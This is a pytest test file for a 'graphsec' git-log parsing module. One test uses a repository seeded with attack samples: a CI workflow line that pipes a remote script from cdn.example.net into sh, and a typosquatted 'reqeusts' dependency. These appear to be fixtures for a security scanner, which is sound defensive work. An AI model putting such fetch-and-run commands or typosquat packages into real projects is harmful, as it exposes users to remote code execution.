from __future__ import annotations

from pathlib import Path

import pytest

from graphsec import git_log


def test_is_git_repo(tiny_repo: Path, tmp_path: Path):
    assert git_log.is_git_repo(tiny_repo)
    assert not git_log.is_git_repo(tmp_path / "nope")


def test_read_commits_parses_numstat(tiny_repo: Path):
    commits = git_log.read_commits(tiny_repo)
    assert len(commits) == 2
    newest = commits[0]
    assert newest.subject == "extend app"
    assert newest.author_email == "ana@example.com"
    assert [c.path for c in newest.changes] == ["src/app.py"]
    assert newest.changes[0].insertions == 1
    assert newest.churn == 1


def test_read_commits_respects_max_commits(tiny_repo: Path):
    assert len(git_log.read_commits(tiny_repo, max_commits=1)) == 1


def test_read_commits_rejects_non_repo(tmp_path: Path):
    with pytest.raises(git_log.GitError):
        git_log.read_commits(tmp_path / "missing")


def test_list_files(tiny_repo: Path):
    assert set(git_log.list_files(tiny_repo)) == {"README.md", "src/app.py"}


def test_show_added_lines(tiny_repo: Path):
    head = git_log.read_commits(tiny_repo, max_commits=1)[0]
    added = git_log.show_added_lines(tiny_repo, head.sha)
    assert "print('there')" in added


def test_added_lines_by_file(planted_repo: Path):
    head = git_log.read_commits(planted_repo, max_commits=1)[0]
    by_file = git_log.added_lines_by_file(planted_repo, head.sha)
    assert set(by_file) == {
        ".github/workflows/release.yml",
        "requirements.txt",
        "src/auth/session.py",
    }
    assert "reqeusts==9.9.9" in by_file["requirements.txt"]
    assert "curl https://cdn.example.net/setup.sh | sh" in by_file[
        ".github/workflows/release.yml"
    ]
    # The "+++ b/<path>" header itself must not leak into the added text.
    assert "+++" not in by_file["src/auth/session.py"]


@pytest.mark.parametrize(
    "spec,expected",
    [
        ("src/a.py", ("src/a.py", None)),
        ("old.py => new.py", ("new.py", "old.py")),
        ("src/{old => new}/f.py", ("src/new/f.py", "src/old/f.py")),
    ],
)
def test_split_rename(spec, expected):
    assert git_log._split_rename(spec) == expected


def test_parse_numstat_handles_binary():
    change = git_log._parse_numstat("-\t-\tassets/logo.png")
    assert change is not None
    assert change.binary
    assert change.churn == 0
